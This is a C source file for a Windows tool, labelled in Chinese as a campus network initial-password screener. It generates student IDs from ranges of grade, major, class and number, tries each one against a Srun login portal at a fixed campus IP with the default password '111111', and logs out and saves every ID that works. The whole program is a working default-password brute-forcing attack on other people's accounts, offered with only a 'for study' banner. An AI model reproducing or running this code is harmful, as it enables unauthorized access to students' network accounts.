#include <curl/curl.h>
#include <stdio.h>
#include <string.h>
struct UserName
{
	int grade;
	int major;
	int class1_start;
	int class1_end;
	int class2_start;
	int class2_end;
};
struct string
{
	char *ptr;
	size_t len;
};
struct link
{
	char UserName[13];
	struct link *next;
};
struct string s;
void init_string(struct string *s)
{
	s->len = 0;
	s->ptr = (char*)malloc(s->len + 1);
	if (s->ptr == NULL)
	{
		exit(EXIT_FAILURE);
	}
	s->ptr[0] = '\0';
}
size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
	size_t new_len = s->len + size*nmemb;
	s->ptr = (char*)realloc(s->ptr, new_len + 1);
	if (s->ptr == NULL)
	{
		exit(EXIT_FAILURE);
	}
	memcpy(s->ptr + s->len, ptr, size*nmemb);
	s->ptr[new_len] = '\0';
	s->len = new_len;
	return size*nmemb;
}
void Post(const char *PostUrl, char *Post)
{
	CURL *curl;
	CURLcode res;
	init_string(&s);
	curl = curl_easy_init();
	curl_easy_setopt(curl, CURLOPT_URL, PostUrl);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Post);
	curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
	res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
}
void URLEncode(char* str, char* result)
{
	int i;
	int j = 0;
	for (i = 0; i<12; i++)
	{
		str[i] = str[i] + 4;
	}
	for (i = 0; i<12; i++)
	{
		switch (str[i])
		{
		case ':':result[j] = '%'; result[j + 1] = '3'; result[j + 2] = 'a'; j += 3; break;
		case ';':result[j] = '%'; result[j + 1] = '3'; result[j + 2] = 'b'; j += 3; break;
		case '<':result[j] = '%'; result[j + 1] = '3'; result[j + 2] = 'c'; j += 3; break;
		case '=':result[j] = '%'; result[j + 1] = '3'; result[j + 2] = 'd'; j += 3; break;
		default:result[j] = str[i], j++;
		}
	}
	result[j] = '\0';
}
void save(struct link *head)
{
	FILE *a;
	a = fopen("result.txt", "w");
	while (head->next != NULL)
	{
		fwrite(head->next->UserName, sizeof(char) * 13, 1, a);
		fputc('\n', a);
		head = head->next;
	}
	fclose(a);
}
int get_info(char *ExitName)
{
	int i = 0;
	CURL *curl = curl_easy_init();
	CURLcode res;
	struct string s;
	init_string(&s);
	const char GET_INFO_URL[] = "http://172.16.154.130/cgi-bin/rad_user_info";
	curl_easy_setopt(curl, CURLOPT_URL, GET_INFO_URL);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
	curl_easy_setopt(curl, CURLOPT_TIMEOUT, 4L);
	res = curl_easy_perform(curl);
	if (s.ptr[0] == 'n')
	{
		return -1;//not online
	}
	else
	{
		while (i < 12)
		{
			ExitName[i] = s.ptr[i];
			i++;
		}
		ExitName[i] = '\0';
		return 0;
	}
}
void ExitUser(char *name)
{
	const char PostUrl[] = "http://172.16.154.130:69/cgi-bin/srun_portal";
	char EncodeName[30];
	char PostText[200];
	strcpy(PostText, "action=logout&ac_id=1&username=%7bSRUN3%7d%0d%0a");
	URLEncode(name, EncodeName);
	strcat(PostText, EncodeName);
	strcat(PostText, "&mac=&type=2");
	Post(PostUrl, PostText);
}
int LoginUser(char *user,struct UserName A,int i,int j)
{
	char grade[5];
	char major[5];
	char username[13];
	strcpy(username, "\0");//初始化后面的cat
	char _class1[3];
	char _class2[3];
	const char PostUrl[] = "http://172.16.154.130:69/cgi-bin/srun_portal";
	char EncodeName[30];
	char PostText[200];
	strcpy(PostText, "action=login&username=%7bSRUN3%7d%0d%0a");
	sprintf(grade, "%04d", A.grade);
	sprintf(major, "%04d", A.major);
	sprintf(_class1, "%02d", i);
	sprintf(_class2, "%02d", j);
	strcat(username, grade);
	strcat(username, major);
	strcat(username, _class1);
	strcat(username, _class2);
	strcpy(user, username);
	URLEncode(username, EncodeName);
	strcat(PostText, EncodeName);
	strcat(PostText, "&password=111111");
	strcat(PostText, "&drop=0&pop=1&type=2&n=117&mbytes=0&minutes=0&ac_id=1&mac=");
	Post(PostUrl, PostText);
	if (*(s.ptr + 6) != 'o') //error
	{
		if (s.ptr[34] == 'L')//limit error 不需要退出
		{
			return -2;
		}
		else if (s.ptr[12] == 'A') //BAS limited 需要退出 
		{
			return -3;
		}
		return -1;//不需要退出
	}
	else
	{
		return 0;//需要退出
	}
}
int main()
{
	system("title 校园网初始密码筛选器");
	int i,l,k=0,x;
	char se;
	struct link *head;
	char user[13];
	char user_t[13];
	head = malloc(sizeof(struct link));
	head->next = NULL;
	struct UserName A;
	const char PostUrl[] = "http://172.16.154.130:69/cgi-bin/srun_portal";
	char ExitName[13];	
	if (get_info(ExitName)==0)
	{
		printf("当前已登录账号：%s\n如需继续需退出该账号,是否继续(Y/n)", ExitName);
		setbuf(stdin, NULL);
		scanf("%c", &se);
		if (se == 'Y' || se == 'y')
		{
			ExitUser(ExitName);
			if (s.ptr[7] != 'o')
			{
				printf("退出失败，请登录控制台确认下线后按任意键继续！\n");
				system("explorer http://172.16.154.130:8800/");
				_getch();
			}
		}
		else
		{
			return 0;
		}
	}
	START:system("cls");
	printf("******************************************************\n"
		"		本程序仅供学习交流使用     \n"
		"		 校园网初始密码筛选器     \n"
		"			Lw-2017          \n"
		"		Usage：输入搜索范围进行搜索   \n"
		"eg:2010    1010     01      03        01       32   )   \n"
		"   年级 专业代号 班级开始 班级结束 学号开始 学号结束)   \n"
		"******************************************************\n");
	printf("请输入：");
	scanf("%d", &A.grade);
	scanf("%d", &A.major);
	scanf("%d", &A.class1_start);
	scanf("%d", &A.class1_end);
	scanf("%d", &A.class2_start);
	scanf("%d", &A.class2_end);
	for (i = A.class1_start; i <= A.class1_end; i++)
	for (l = A.class2_start; l <= A.class2_end; l++)
		{
			Sleep(1000);
			if (x = LoginUser(user,A,i,l), x == 0||x==-2||x==-3)
			{
				printf("ID:%s", user);
				printf("     Result：LoginOK");
				if (x==-3||x==0)
				{
					strcpy(user_t, user);
					ExitUser(user);
					if (s.ptr[7]!='o'&& s.ptr[6] != 'e')
					{
						printf("退出失败，请登录控制台确认下线后按任意键继续！\n");
						system("explorer http://172.16.154.130:8800/");
						_getch();
					}
				}
				struct link * temp = malloc(sizeof(struct link));
				strcpy(temp->UserName, user_t);
				temp->next = head->next;
				head->next = temp;
				printf("\n");
			}
			else
			{
				printf("ID:%s", user);
				printf("     Result：NotWork\n");
			}
		}
	SAVE:if (head->next == NULL)
	{
		printf("输入区间有误或者未找到可用数据!\n");
		printf("是否继续搜索？(Y/n)");
		setbuf(stdin, NULL);
		scanf("%c", &se);
		if (se == 'Y' || se == 'y')
		{
			goto START;
		}
		else
		return 0;
	}
	printf("是否保存已搜索到的数据？(Y/n)");
	setbuf(stdin, NULL);
	scanf("%c", &se);
	if (se == 'Y' || se == 'y')
	{
		save(head);
		printf("已保存数据！\n"); 

	}
	else
	{
		printf("未保存数据！\n");
	}
	printf("是否继续？(Y/n)");
	setbuf(stdin, NULL);
	scanf("%c", &se);
	if (se == 'Y' || se == 'y')
	{
		goto START;
	}
	return 0;
}
